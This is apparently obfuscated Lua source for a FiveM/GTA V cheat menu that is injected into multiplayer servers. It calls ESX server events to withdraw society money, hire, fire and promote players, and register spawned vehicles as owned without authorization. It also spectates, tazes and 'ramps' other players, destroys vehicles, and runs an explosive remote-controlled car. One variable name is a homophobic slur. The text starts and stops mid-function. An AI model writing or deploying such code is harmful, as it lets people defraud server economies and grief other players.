ESX.ShowNotification(('invalid_amount_max'))				else					menu2.close()					ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_society:setJobSalary', function()						OpenManageGradesMenu66(society)					end, society, data.current.value, amount)				end			end, function(data2, menu2)				menu2.close()			end)		end, function(data, menu)			menu.close()		end)	end, society)end function OpenPromoteMenu(society, employee)	ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_society:getJob', function(job)		local elements = {}		for i=1, #job.grades, 1 do			local gradeLabel = (job.grades[i].label == '' and job.label or job.grades[i].label)			table.insert(elements, {label = gradeLabel, value = job.grades[i].grade, selected = (employee.job.grade == job.grades[i].grade)})		end		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'promote_employee_' .. society,		{			title    = (society),			align    = 'bottom-left',			elements = elements		}, function(data, menu)			menu.close()			ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_society:setJob', function()				OpenEmployeeList66(society)			end, employee.identifier, society, data.current.value, 'promote')		end, function(data, menu)			menu.close()			OpenEmployeeList66(society)		end)	end, society)end function OpenRecruitMenu(society)ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_society:getOnlinePlayers', function(players)local elements = {}for i=1, #players, 1 do	if players[i].job.name ~= society then		table.insert(elements, {label = players[i].name, value = players[i].source, name = players[i].name, identifier = players[i].identifier})	end end ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'recruit_' .. society,{	title    = ('Maybe?'),	align    = 'bottom-left',	elements = elements}, function(data, menu)ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'recruit_confirm_' .. society,{	title    = (society),	align    = 'bottom-left',	elements = {		{label = ('no'),  value = 'no'},		{label = ('yes'), value = 'yes'}	}}, function(data2, menu2)	menu2.close()	if data2.current.value == 'yes' then		ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_society:setJob', function()			OpenRecruitMenu(society)		end, data.current.identifier, society, 0, 'hire')	end end, function(data2, menu2)	menu2.close()end)end, function(data, menu)menu.close()end)end)end function OpenManageEmployeesMenu66(society)ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'manage_employees_' .. society,{title    = (society),align    = 'bottom-left',elements = {{label = ('employee_list'), value = 'employee_list'},{label = ('recruit'),       value = 'recruit'},}}, function(data, menu)if data.current.value == 'employee_list' then OpenEmployeeList66(society)end if data.current.value == 'recruit' then OpenRecruitMenu(society)end end, function(data, menu)menu.close()end)end function OpenEmployeeList66(society)ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_society:getEmployees', function(employees)local elements = {head = {('employee'), ('grade'), ('actions')},rows = {}}for i=1, #employees, 1 do local gradeLabel = (employees[i].job.grade_label == '' and employees[i].job.label or employees[i].job.grade_label)table.insert(elements.rows, {data = employees[i],cols = {employees[i].name,gradeLabel,'{{' .. ('promote') .. '|promote}} {{' .. ('fire') .. '|fire}}'}})end ESX.UI.Menu.Open('list', GetCurrentResourceName(), 'employee_list_' .. society, elements, function(data, menu)local employee = data.data if data.value == 'promote' then menu.close()OpenPromoteMenu(society, employee)end if data.value == 'fire' then ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_society:setJob', function()OpenEmployeeList66(society)end, employee.identifier, 'unemployed', 0, 'fire')end end, function(data, menu)menu.close()OpenManageEmployeesMenu66(society)end)end, society)end function SyUbPKSyUmCbSE6L(society)local elements = {}table.insert(elements, {label = ('withdraw_money'), value = 'withdraw_society_money'})table.insert(elements, {label = ('deposit_money'), value = 'deposit_money'})table.insert(elements, {label = ('manage_employees'), value = 'manage_employees'})table.insert(elements, {label = ('manage_grades'), value = 'manage_grades'})ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'boss_actions_' .. society,{title    = (society),align    = 'bottom-left',elements = elements}, function(data, menu)if data.current.value == 'withdraw_society_money' then ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'withdraw_society_money_amount_' .. society,{title    = (society)}, function(data, menu)local amount = tonumber(data.value)if amount == Pryorbypessed then ESX.ShowNotification(('Invaligidi'))else menu.close()Pryorbypessed1(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_society:withdrawMoney', society, amount)end end, function(data, menu)menu.close()end)elseif data.current.value == 'deposit_money' then ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'deposit_money_amount_' .. society,{title    = (society)}, function(data, menu)local amount = tonumber(data.value)if amount == Pryorbypessed then ESX.ShowNotification(('Invailid'))else menu.close()Pryorbypessed1(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_society:depositMoney', society, amount)end end, function(data, menu)menu.close()end)elseif data.current.value == 'manage_employees' then OpenManageEmployeesMenu66(society)elseif data.current.value == 'manage_grades' then OpenManageGradesMenu66(society)end end,function(data, menu)menu.close()end)end

function m5BV53w6YbRZc9NJ(playerVeh)
  RequestControl(playerVeh)
      SetVehicleHasBeenOwnedByPlayer(playerVeh, Pryorbypessed2)
      SetEntityAsMissionEntity(playerVeh, Pryorbypessed2, Pryorbypessed2)
      StartVehicleAlarm(playerVeh)
      DetachVehicleWindscreen(playerVeh)
      SmashVehicleWindow(playerVeh, 0)
      SmashVehicleWindow(playerVeh, 1)
      SmashVehicleWindow(playerVeh, 2)
      SmashVehicleWindow(playerVeh, 3)
      SetVehicleTyreBurst(playerVeh, 0, Pryorbypessed3, 1000.0)
      SetVehicleTyreBurst(playerVeh, 1, Pryorbypessed3, 1000.0)
      SetVehicleTyreBurst(playerVeh, 2, Pryorbypessed3, 1000.0)
      SetVehicleTyreBurst(playerVeh, 3, Pryorbypessed3, 1000.0)
      SetVehicleTyreBurst(playerVeh, 4, Pryorbypessed3, 1000.0)
      SetVehicleTyreBurst(playerVeh, 5, Pryorbypessed3, 1000.0)
      SetVehicleTyreBurst(playerVeh, 4, Pryorbypessed3, 1000.0)
      SetVehicleTyreBurst(playerVeh, 7, Pryorbypessed3, 1000.0)
      SetVehicleDoorBroken(playerVeh, 0, Pryorbypessed3)
      SetVehicleDoorBroken(playerVeh, 1, Pryorbypessed3)
      SetVehicleDoorBroken(playerVeh, 2, Pryorbypessed3)
      SetVehicleDoorBroken(playerVeh, 3, Pryorbypessed3)
      SetVehicleDoorBroken(playerVeh, 4, Pryorbypessed3)
      SetVehicleDoorBroken(playerVeh, 5, Pryorbypessed3)
      SetVehicleDoorBroken(playerVeh, 6, Pryorbypessed3)
      SetVehicleDoorBroken(playerVeh, 7, Pryorbypessed3)
      SetVehicleLights(playerVeh, 1)
      Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
      SetVehicleNumberPlateTextIndex(playerVeh, 5)
      SetVehicleNumberPlateText(playerVeh, "67cnj087")
      SetVehicleDirtLevel(playerVeh, 10.0)
      SetVehicleModColor_1(playerVeh, 1)
      SetVehicleModColor_2(playerVeh, 1)
      SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
      SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
      SetVehicleBurnout(playerVeh, Pryorbypessed3)
end

	  function fLFGgqnXT5b9hzvd()
		local ModelName = Pryorbypessed8("Enter Vehicle Spawn Name", "", 100)
		local NewPlate = Pryorbypessed8("Enter Vehicle Licence Plate", "", 100)
	
		if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
				RequestModel(ModelName)
				while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
				end
	
				local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), Pryorbypessed3, Pryorbypessed3)
				SetVehicleNumberPlateText(veh, NewPlate)
				local vehProps = vqE26kTg3G4gzbjK(veh)
				PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_vehicleshop:setVehicleOwned"), vehProps)
				BBWMqktLdH6yHbfd("~g~~h~Success", Pryorbypessed2)
		else
				BBWMqktLdH6yHbfd("~b~~h~Model is not valid !", Pryorbypessed3)
		end
	end



      function WEQ2eN7DkB3bBtta()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, Pryorbypessed3)
        if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
          SetVehicleOnGroundProperly(playerVeh)
          BBWMqktLdH6yHbfd("~g~Vehicle Flipped!", Pryorbypessed2)
        else
          BBWMqktLdH6yHbfd("~b~You Aren't In The Driverseat Of A Vehicle!", Pryorbypessed3)
        end
      end


      local kn7F9Kg8uHDBqjfq = Pryorbypessed2

      function rmbU6M4NCTUJ5XjH(player)
        local playerPed = PlayerPedId(-1)
        kn7F9Kg8uHDBqjfq = not kn7F9Kg8uHDBqjfq
        local targetPed = GetPlayerPed(player)

        if (kn7F9Kg8uHDBqjfq) then
          local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, Pryorbypessed2))

          RequestCollisionAtCoord(targetx, targety, targetz)
          NetworkSetInSpectatorMode(Pryorbypessed3, targetPed)

          BBWMqktLdH6yHbfd("Spectating " .. GetPlayerName(player), Pryorbypessed2)
        else
          local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, Pryorbypessed2))

          RequestCollisionAtCoord(targetx, targety, targetz)
          NetworkSetInSpectatorMode(Pryorbypessed2, targetPed)

          BBWMqktLdH6yHbfd("Stopped Spectating " .. GetPlayerName(player), Pryorbypessed2)
        end
      end

      function YTkdZGZtb6kEaMdR(veh)
        SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0)
        SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 7)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 1) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 2) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 3) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 4) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 5) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 6) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 7) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 8) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 9) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 10) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 11) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 12) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 13) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 14, 16, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 15) - 2, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 16) - 1, Pryorbypessed2)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 17, Pryorbypessed3)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 18, Pryorbypessed3)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 19, Pryorbypessed3)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 20, Pryorbypessed3)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 21, Pryorbypessed3)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 22, Pryorbypessed3)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 23, 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 24, 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 25) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 27) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 28) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 30) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 33) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 34) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 35) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 38) - 1, Pryorbypessed3)
        SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 1)
        SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), Pryorbypessed2)
        SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 5)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, Pryorbypessed3)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, Pryorbypessed3)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, Pryorbypessed3)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, Pryorbypessed3)
        SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
      end






      function NgAVqVdKSWRMgz6m(veh)
        SetEntityAsMissionEntity(Object, 1, 1)
        DeleteEntity(Object)
        SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 1, 1)
        DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2))
      end


      function HgYQY9eW89SaxEcL(veh)
        SetVehicleDirtLevel(veh, 15.0)
      end

      function yQS9duT9LDSKstb2(veh)
        SetVehicleDirtLevel(veh, 1.0)
      end
      function x9Cu5JS3Czn8JvVd(entity, direction)
        ApplyForceToEntity(entity, 3, direction, 0, 0, 0, Pryorbypessed2, Pryorbypessed2, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3)
      end

      function RequestControlOnce(entity)
        if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
          return Pryorbypessed3
        end
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), Pryorbypessed3)
        return NetworkRequestControlOfEntity(entity)
      end

      function RequestControl(entity)
        Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
          tick = tick+1
          Wait(0)
        end
        return tick <= 12
        end)
      end

      local FreeCameraMode = "Object Spooner"


      function Oscillate(entity, position, angleFreq, dampRatio)
        local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq*angleFreq))
        local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
        local targetPos = SubVectors(pos1, pos2)

        x9Cu5JS3Czn8JvVd(entity, targetPos)
      end

      function getEntity(player)
        local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
        return entity
      end

      function GetInputMode()
        return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
      end	
		
		function RampPlayer(player)
	Citizen.CreateThread(function()
		local ped = GetPlayerPed(player)
		local coords = GetEntityCoords(ped)
		local x = coords.x
		local y = coords.y
		local z = coords.z
		
		local faggot = CreateObject(GetHashKey("stt_prop_stunt_track_start"), x, y, z, 1, 1, 1)
		local faggot2 = CreateObject(GetHashKey("stt_prop_stunt_track_start"), x + 10, y, z, 1, 1, 1)
		local faggot3 = CreateObject(GetHashKey("stt_prop_stunt_track_start"), x, y + 10, z, 1, 1, 1)
		SetEntityHeading(faggot, GetEntityHeading(ped))
		SetEntityHeading(faggot2, GetEntityHeading(ped) + 90)
		SetEntityHeading(faggot3, GetEntityHeading(ped) + 160)
		FreezeEntityPosition(faggot, Pryorbypessed3)
		FreezeEntityPosition(faggot2, Pryorbypessed3)
		FreezeEntityPosition(faggot3, Pryorbypessed3)

		if killmenu then
			return
		end
		return ExitThread
	end)
end
		
		function AllPlayersAreARamp()
	local playerlist = GetActivePlayers()
	
	for i = 1, #playerlist do
		Wait(0)
		local PlayerToRamp = playerlist[i]
		RampPlayer(PlayerToRamp)
	end
end

		function RampCar(player)
	local ped = GetPlayerPed(player)
	local coords = GetOffsetFromEntityInWorldCoords(ped, 0.0, 8.0, 0.5)
	local x = coords.x
	local y = coords.y
	local z = coords.z

	if not HasModelLoaded(GetHashKey("t20")) then
		RequestModel(GetHashKey("t20"))
		Wait(500)
	end

	local vehi = CreateVehicle(GetHashKey("t20"), x, y, z, 0.0, 1, 1)
	Wait(50)
	if DoesEntityExist(vehi) then
	    local ramp = CreateObject(GetHashKey("prop_jetski_ramp_01"), x, y, z - 1, 1, 1, 1)
		SetEntityHeading(vehi, GetEntityHeading(ped))
		SetPedIntoVehicle(ped, vehi, -1)
		AttachEntityToEntity(ramp, vehi, 0, 0.0, 3.0, 0.0, 0.0, 0.0, 180.0, Pryorbypessed2, Pryorbypessed2, Pryorbypessed3, Pryorbypessed2, 0, Pryorbypessed3)
		SetVehicleCustomPrimaryColour(vehi, 0, 0, 0)
		SetVehicleCustomSecondaryColour(vehi, 0, 0, 0)
		MaxOut(vehi)
	else
        return
	end
end		
	
	function RampAllCars()
	for vehicle in EnumerateVehicles() do
		local ramp = CreateObject(GetHashKey("stt_prop_stunt_track_start"), 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
		NetworkRequestControlOfEntity(vehicle)
		if DoesEntityExist(vehicle) then
			AttachEntityToEntity(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
		end
		NetworkRequestControlOfEntity(ramp)
		SetEntityAsMissionEntity(ramp, Pryorbypessed3, Pryorbypessed3)
	end
end	
		
		local function TazePlayer(player)
	local ped = GetPlayerPed(player)
	local tLoc = GetEntityCoords(ped)

	local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
	local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



	ShootSingleBulletBetweenCoords(origin, destination, 1, Pryorbypessed3, `WEAPON_STUNGUN`, PlayerPedId(), Pryorbypessed3, Pryorbypessed2, 1.0)
end
			
			local function fv()
    local cb = Pryyyorbypass('Digite o Nome do Veiculo', '', 100)
    local cw = Pryyyorbypass('Digite Seu RG :', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            Pryorbypessed3,
            Pryorbypessed3
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        Pryorbypessed1('esx_vehicleshop:setVehicleOwned', cx)
        av('~g~~h~Successo', Pryorbypessed2)
    else
        av('~b~~h~Modelo Invalido!', Pryorbypessed3)
    end
  end

local year, month, day, hour, minute, second = GetLocalTime()
local InjectionTime = string.format("%02d/%02d/%04d", day, month, year) .. " " .. string.format("%02d:%02d", hour, minute)

function kbinput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = Pryorbypessed3

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = Pryorbypessed2
		return result
	else
		Citizen.Wait(500)
		blockinput = Pryorbypessed2
		return nil
	end
end

local xlpcarmodtt = {}



xlpcarmodtt.Start = function()
	if DoesEntityExist(xlpcarmodtt.Entity) then return end

	xlpcarmodtt.Spawn()

	xlpcarmodtt.Tablet(Pryorbypessed3)

	while DoesEntityExist(xlpcarmodtt.Entity) and DoesEntityExist(xlpcarmodtt.Driver) do
		Citizen.Wait(5)

		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(xlpcarmodtt.Entity), Pryorbypessed3)

		xlpcarmodtt.DrawInstructions(distanceCheck)
		xlpcarmodtt.HandleKeys(distanceCheck)

		if distanceCheck <= 10000000.0 then
			if not NetworkHasControlOfEntity(xlpcarmodtt.Driver) then
				NetworkRequestControlOfEntity(xlpcarmodtt.Driver)
			elseif not NetworkHasControlOfEntity(xlpcarmodtt.Entity) then
				NetworkRequestControlOfEntity(xlpcarmodtt.Entity)
			end
		else
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 6, 2500)
		end
	end
end

xlpcarmodtt.HandleKeys = function(distanceCheck)
	if IsControlJustReleased(0, 47) then
		if IsCamRendering(xlpcarmodtt.Camera) then
			xlpcarmodtt.ToggleCamera(Pryorbypessed2)
		else
			xlpcarmodtt.ToggleCamera(Pryorbypessed3)
		end
	end

	if distanceCheck <= 10000000.0 then
		if IsControlJustPressed(0, 73) then
			xlpcarmodtt.Attach("pick")
		end
	end

	if distanceCheck < 10000000.0 then
		if IsControlJustReleased(0, 108) then
			local coos = GetEntityCoords(xlpcarmodtt.Entity, Pryorbypessed3)
			AddExplosion(coos.x, coos.y, coos.z, 2, 100000.0, Pryorbypessed3, Pryorbypessed2, 0)
		end
		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 9, 1)
		end
		
		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 6, 2500)
		end

		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 22, 1)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 13, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 14, 1)
		end

		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 30, 100)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 7, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 8, 1)
		end

		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 4, 1)
		end

		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(xlpcarmodtt.Driver, xlpcarmodtt.Entity, 5, 1)
		end
	end
end

xlpcarmodtt.DrawInstructions = function(distanceCheck)
	local steeringButtons = {
		{
			["label"] = "Esquerda",
			["button"] = "~INPUT_CELLPHONE_RIGHT~"
		},
		{
			["label"] = "Frente",
			["button"] = "~INPUT_CELLPHONE_UP~"
		},
		{
			["label"] = "Ré",
			["button"] = "~INPUT_CELLPHONE_DOWN~"
		},
		{
			["label"] = "Direita",
			["button"] = "~INPUT_CELLPHONE_LEFT~"
		}
	}

	local pickupButton = {
		["label"] = "Deletar",
		["button"] = "~INPUT_VEH_DUCK~"
	}
	
	local explodeButton = {
		["label"] = "Explodir",
		["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"
	}

	local buttonsToDraw = {
		{
			["label"] = "Camera no Veiculo",
			["button"] = "~INPUT_DETONATE~"
		}
	}

	if distanceCheck <= 10000000.0 then
		for buttonIndex = 1, #steeringButtons do
			local steeringButton = steeringButtons[buttonIndex]

			table.insert(buttonsToDraw, steeringButton)
		end

		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, explodeButton)
		end
		
		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, pickupButton)
		end
	end

	Citizen.CreateThread(function()
		local instructionScaleform = RequestScaleformMovie("instructional_buttons")

		while not HasScaleformMovieLoaded(instructionScaleform) do
			Wait(0)
		end

		PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
		PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
		PushScaleformMovieFunctionParameterBool(0)
		PopScaleformMovieFunctionVoid()

		for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
			PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
			PushScaleformMovieFunctionParameterInt(buttonIndex - 1)

			PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
			PushScaleformMovieFunctionParameterString(buttonValues["label"])
			PopScaleformMovieFunctionVoid()
		end

		PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
		PushScaleformMovieFunctionParameterInt(-1)
		PopScaleformMovieFunctionVoid()
		DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
	end)
end

-- 4x482

xlpcarmodtt.Spawn = function()
	xlpcarmodtt.LoadModels({ GetHashKey(RcModel), 68070371 })

